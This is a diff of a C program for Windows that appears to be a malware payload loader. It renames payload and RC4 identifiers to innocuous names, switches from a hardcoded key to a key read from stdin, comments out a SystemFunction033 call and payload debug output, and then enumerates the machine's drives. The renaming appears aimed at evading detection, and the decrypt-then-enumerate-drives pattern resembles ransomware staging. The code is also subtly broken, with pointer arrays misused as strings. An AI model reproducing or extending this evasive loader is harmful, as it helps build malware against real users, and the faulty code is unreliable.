@@ -7,27 +7,34 @@ int main(void)
 {
 	call();
 	
-	LPPAYLOAD pPayload = Test();
+	LPTEXT pText_t = Test();
 	
-	if (pPayload == NULL) return -5;
+	if (pText_t == NULL) return -5;
 
-	printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n", (LPSTR)pPayload->pPayloadAddress, (LPSTR)pPayload->pPayloadAddress);
+	unsigned char *pK[2049] = {'\0'};
 
-	const unsigned char *pKey = "0xdeadbeef";
+	//printf("[!] Enter Your Key Please:\n");
+	
+	fgets(pK, 2048, stdin);
 
-	unsigned char *pDecryptedPayload = malloc(pPayload->dwPayloadSize);
+	unsigned char *pDecryptedPayload = malloc(pText_t->sText);
 
-	printf("[i] dwPayloadSize var : %lu \n", pPayload->dwPayloadSize);
+	Context context_t = { NULL };
+	
+	//for (int i = 0; i < )
+	
+	//SystemFunction033(pK, pText_t->pPayloadAddress, strlen(pK), pText->dwPayloadSize);
 
-	RC4CONTEXT context_t = { NULL };
+	
 
-	RC4Init(&context_t, pKey, strlen(pKey));
+	rInit(&context_t, pK, strlen(pK));
 
-	RC4Encrypt(&context_t, pPayload->pPayloadAddress, pDecryptedPayload, pPayload->dwPayloadSize);
+	rFin(&context_t, pText_t->pText, pDecryptedPayload, pText_t->sText);
 
-	pPayload->pPayloadAddress = pDecryptedPayload;
+	
 
-	printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pDecryptedPayload, pDecryptedPayload);
+	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);
+	
 	LPWSTR pPath[MAX_PATH] = { L'\0' };
 
 	FetchDrives(pPath);
